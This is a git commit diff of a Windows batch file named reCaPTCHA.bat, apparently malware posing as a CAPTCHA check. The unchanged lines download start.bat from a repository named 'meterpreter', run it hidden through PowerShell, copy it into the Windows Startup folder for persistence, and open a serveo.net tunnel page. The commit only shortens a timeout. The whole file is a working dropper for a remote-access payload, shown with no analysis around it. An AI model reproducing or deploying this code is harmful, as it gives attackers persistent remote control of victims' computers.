72b42f92e3100a970aed3b111591fdfb7d19491b
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-09-21 21:37:34 +0300

    Update reCaPTCHA.bat

--- reCaPTCHA.bat
+++ reCaPTCHA.bat
@@ -1,7 +1,7 @@
 @echo off
 curl https://raw.githubusercontent.com/0x2034/meterpreter/main/start.bat -o "%temp%\start.bat"
 powershell -c "Start-Process -FilePath "%temp%\start.bat" -WindowStyle Hidden" 
-timeout /t 2
+timeout /t 1 >nul
 move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 start https://defa6afad8d2a559be5ed784245d4cdb.serveo.net/reCaPTCHA/r.html
 
